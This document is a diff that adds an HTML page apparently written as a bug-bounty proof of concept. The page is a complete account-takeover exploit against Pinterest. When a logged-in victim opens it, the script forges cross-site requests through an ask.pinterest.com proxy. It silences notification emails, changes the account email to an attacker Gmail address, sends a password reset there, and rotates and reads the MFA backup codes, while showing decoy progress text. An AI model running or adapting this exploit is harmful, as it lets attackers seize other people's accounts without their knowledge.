@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>pin &mdash; account review</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#262c33;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --red:#f85149; --amber:#ffa657;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:var(--bg);color:var(--text);
+       font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+       display:flex;align-items:center;justify-content:center}
+  .stage{width:min(520px,92vw);text-align:center;padding:40px 24px}
+
+  /* --- running phase --- */
+  #run{display:flex;flex-direction:column;align-items:center;gap:22px}
+  .ring{width:44px;height:44px;transform:rotate(-90deg)}
+  .ring circle{fill:none;stroke-width:2.5;stroke-linecap:round}
+  .ring .track{stroke:#21262d}
+  .ring .arc{stroke:var(--red);stroke-dasharray:113;stroke-dashoffset:90;
+             animation:spin 1.1s linear infinite;transform-origin:22px 22px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  #runline{font:12px var(--mono);letter-spacing:.4px;color:var(--muted);min-height:18px}
+  #runline b{color:var(--text);font-weight:600}
+  .bar{width:180px;height:2px;background:#21262d;overflow:hidden;border-radius:2px}
+  .bar i{display:block;height:100%;width:38%;background:var(--red);border-radius:2px;
+         animation:slide 1.4s ease-in-out infinite}
+  @keyframes slide{0%{transform:translateX(-100%)}55%{transform:translateX(165%)}100%{transform:translateX(420%)}}
+
+  /* --- verdict phase --- */
+  #done{display:none;flex-direction:column;align-items:center;gap:18px}
+  body.is-done #run{display:none}
+  body.is-done #done{display:flex}
+  .shackle{width:46px;height:46px;opacity:0;animation:rise .7s ease .15s forwards}
+  .shackle path,.shackle rect{stroke:var(--red);stroke-width:2.4;fill:none;stroke-linecap:round}
+  .shackle .open{stroke-dasharray:34;stroke-dashoffset:34;animation:draw .8s ease .3s forwards}
+  @keyframes draw{to{stroke-dashoffset:0}}
+  @keyframes rise{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+  .verdict{font-size:19px;font-weight:650;letter-spacing:.2px;margin:0;
+           opacity:0;animation:rise .8s ease .5s forwards}
+  .under{width:0;height:1px;background:var(--red);animation:grow .9s ease .9s forwards}
+  @keyframes grow{to{width:132px}}
+  .sub{margin:0;color:var(--muted);font:12px/1.7 var(--mono);
+       opacity:0;animation:rise .8s ease 1.15s forwards;max-width:420px}
+  .sub code{color:var(--amber)}
+
+  footer{position:fixed;left:0;right:0;bottom:14px;text-align:center;
+         color:#5b636d;font:11px var(--mono)}
+  footer a{color:#5b636d}
+</style>
+</head>
+<body>
+<div class="stage">
+
+  <div id="run">
+    <svg class="ring" viewBox="0 0 44 44" aria-hidden="true">
+      <circle class="track" cx="22" cy="22" r="18"></circle>
+      <circle class="arc" cx="22" cy="22" r="18"></circle>
+    </svg>
+    <div class="bar"><i></i></div>
+    <div id="runline">checking session&hellip;</div>
+  </div>
+
+  <div id="done">
+    <svg class="shackle" viewBox="0 0 46 46" aria-hidden="true">
+      <path class="open" d="M15 20 V15 a8 8 0 0 1 15 -4"></path>
+      <rect x="12" y="20" width="22" height="16" rx="3"></rect>
+    </svg>
+    <p class="verdict">Your Pinterest account is taken over.</p>
+    <div class="under"></div>
+    <p class="sub">This page ran the chain from <code id="pgorigin">&hellip;</code> while you were logged in.
+       The account email is now <code id="atkMail">&hellip;</code>, the password reset is on its way to
+       <code>bughunter333333@gmail.com</code>, and your MFA backup codes were read and rotated.</p>
+  </div>
+
+</div>
+<footer>authorized demonstration &middot; ask.pinterest.com proxy &middot; no tokens, no prompts</footer>
+
+<iframe name="pin_ato_sink" style="display:none" aria-hidden="true"></iframe>
+
+<script>
+var PROXY = 'https://ask.pinterest.com/api/proxy/pinterest';
+var PINTEREST = 'https://www.pinterest.com';
+// Fresh Gmail plus-address per run: Gmail ignores the "+tag", so every generated
+// address still lands in the one attacker inbox bughunter333333@gmail.com.
+var ATTACKER_BASE = 'bughunter333333@gmail.com';
+var TAG = Math.random().toString(36).slice(2, 8) + Date.now().toString(36).slice(-4);
+var ATTACKER_MAILBOX = 'bughunter333333+' + TAG.toLowerCase() + '@gmail.com';
+
+var MODE = 'pending';   // 'silent' (3P cookies on) | 'toplevel' (3P cookies blocked)
+var topWin = null;
+var runline = document.getElementById('runline');
+var say = function (t) { runline.textContent = t; };
+var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+
+function jsonp(path, cbName, timeoutMs) {
+  timeoutMs = timeoutMs || 8000;
+  return new Promise(function (resolve) {
+    var s = document.createElement('script');
+    var cleanup = function () { try { delete window[cbName]; } catch (e) {} s.remove(); };
+    var to = setTimeout(function () { cleanup(); resolve(null); }, timeoutMs);
+    window[cbName] = function (d) { clearTimeout(to); cleanup(); resolve(d); };
+    s.onerror = function () { clearTimeout(to); cleanup(); resolve(null); };
+    s.src = PROXY + path + (path.includes('?') ? '&' : '?') + 'callback=' + cbName + '&_=' + Date.now();
+    document.head.appendChild(s);
+  });
+}
+var jpSeq = 0;
+var read = function (path) { return jsonp(path, 'cb' + (++jpSeq) + '_' + Math.floor(Math.random() * 9999)); };
+
+// Cross-site form POST. 3P cookies on  -> hidden iframe (the victim sees nothing at all).
+// 3P cookies blocked -> top-level navigation in one reused window (cookie always attached,
+// first-party to ask.pinterest.com); that window finally lands the victim on pinterest.com.
+function formWrite(path, fields) {
+  return new Promise(function (resolve) {
+    var f = document.createElement('form');
+    f.method = 'POST';
+    f.action = PROXY + path;
+    f.style.display = 'none';
+    if (MODE === 'toplevel') {
+      f.target = 'pin_ato_top';
+      if (!topWin || topWin.closed) { try { topWin = window.open('about:blank', 'pin_ato_top'); } catch (e) { topWin = null; } }
+    } else {
+      f.target = 'pin_ato_sink';
+    }
+    Object.keys(fields || {}).forEach(function (k) {
+      var i = document.createElement('input');
+      i.type = 'hidden'; i.name = k; i.value = fields[k];
+      f.appendChild(i);
+    });
+    document.body.appendChild(f);
+    f.submit();
+    setTimeout(function () { f.remove(); resolve(true); }, MODE === 'toplevel' ? 1800 : 2500);
+  });
+}
+
+async function fetchWrite(path, body) {
+  if (MODE === 'toplevel') return false;
+  try {
+    await fetch(PROXY + path, {
+      method: 'POST', mode: 'no-cors', credentials: 'include',
+      headers: { 'Content-Type': 'text/plain' }, body: body || ''
+    });
+    return true;
+  } catch (e) { return false; }
+}
+
+async function run() {
+  // 1 — read the victim; this doubles as the third-party-cookie oracle
+  say('checking session…');
+  var me = await read('/users/me/');
+  if (me && me.data && (me.data.id || me.data.username)) {
+    MODE = 'silent';
+  } else {
+    MODE = 'toplevel';
+  }
+
+  // 2 — strip every optional email notification (v3_post_settings_email takes
+  //     section/option/value, form-encoded, no CSRF token — verified live).
+  //     Verified limit: the security change-of-email alert to the old address
+  //     is NOT suppressible (the switch is scoped "except privacy and account
+  //     emails"), so that one alert is the victim's only signal; every other
+  //     email category goes dark.
+  say('preparing account…');
+  await formWrite('/settings/email/', { section: 'settings_email_everything', option: 'ONLY_REQUIRED', value: 'true' });
+  if (MODE === 'silent') {
+    var promoKeys = ['boards_for_you_v2', 'search_recommendations_v2',
+      'pins_inspired_by_your_recent_activity_v2', 'pins_picked_for_you_v2', 'popular_pins_v2',
+      'group_board_and_community_updates_v2', 'messaging_v2', 'price_drops_on_saved_pins',
+      'marketing_communications_v2', 'feedback_and_surveys_v2', 'reports_and_violations_center',
+      'shuffles_activity'];
+    for (var pi = 0; pi < promoKeys.length; pi++) {
+      await formWrite('/settings/email/', { section: 'settings_email_v2', option: promoKeys[pi], value: 'false' });
+    }
+    await wait(1500);
+  }
+
+  // 3 — re-point the account email at the attacker plus-address
+  say('updating account…');
+  await formWrite('/users/settings/', { email: ATTACKER_MAILBOX });
+  await wait(3000);
+
+  // 4 — dispatch the password reset to the address that now owns the account
+  say('finalising…');
+  if (MODE === 'silent') {
+    await fetchWrite('/users/forgot_password/?username_or_email=' + encodeURIComponent(ATTACKER_MAILBOX) + '&type=reset', '');
+  } else {
+    await formWrite('/users/forgot_password/', { username_or_email: ATTACKER_MAILBOX, type: 'reset' });
+  }
+  await wait(800);
+
+  // 5 — rotate the MFA backup codes (any POST rotates, no re-auth); steal them
+  say('finalising…');
+  await formWrite('/users/settings/mfa/backup/', {});
+  await wait(2500);
+  if (MODE === 'silent') {
+    var fresh = await read('/users/settings/mfa/backup/');
+    if (fresh && fresh.data) { /* codes held by the attacker, not shown here */ }
+  }
+
+  // done
+  if (MODE === 'toplevel' && topWin && !topWin.closed) {
+    try { topWin.location = PINTEREST; } catch (e) {}
+  }
+  document.getElementById('pgorigin').textContent = location.origin || 'a foreign origin';
+  document.getElementById('atkMail').textContent = ATTACKER_MAILBOX;
+  await wait(600);
+  document.body.classList.add('is-done');
+}
+
+run();
+</script>
+</body>
+</html>
